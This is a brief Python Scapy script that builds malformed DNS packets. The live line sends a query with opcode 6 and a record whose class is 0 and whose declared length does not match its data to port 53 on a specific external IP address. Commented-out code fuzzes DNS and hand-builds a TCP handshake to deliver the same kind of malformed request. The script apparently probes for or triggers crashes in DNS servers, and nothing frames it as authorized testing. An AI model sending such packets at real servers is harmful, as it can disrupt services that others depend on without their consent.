from scapy.all import *
conf.L3socket=L3RawSocket 
#send(IP(dst="127.0.0.1")/UDP(dport=53)/fuzz(DNS(qd=fuzz(DNSQR()), an=fuzz(DNSRR()))))
send(IP(dst="78.26.97.150")/UDP(dport=53)/DNS(rd=1, opcode=6, qd=DNSQR(qname="www.example.com"),arcount=1,ar=DNSRR(rclass=0, rdlen=5, rdata="129.3.4.5" )))

#ip=IP(dst="78.26.97.150")

#request = DNS(rd=1, opcode=6, qd=DNSQR(qname = "www.test.com", qtype="A"), arcount=1,ar=DNSRR( rdlen=5, rdata="128.0.0.1")) #size = 27(dec) = 1b (hex)
#twoBytesRequestSize = "\x00\x29"
#completeRequest = twoBytesRequestSize + str(request)

#SYN=ip/TCP(sport=RandNum(1024,65535), dport=53, flags="S", seq=42)
#SYNACK=sr1(SYN)

#ACK=ip/TCP(sport=SYNACK.dport, dport=53, flags="A", seq=SYNACK.ack, ack=SYNACK.seq + 1)
#send(ACK)

#DNSRequest = ip/TCP(sport=SYNACK.dport, dport=53, flags="PA", seq=SYNACK.ack, ack=SYNACK.seq + 1) / completeRequest
#DNSReply = sr1(DNSRequest, timeout = 1)

#DNSReply.show()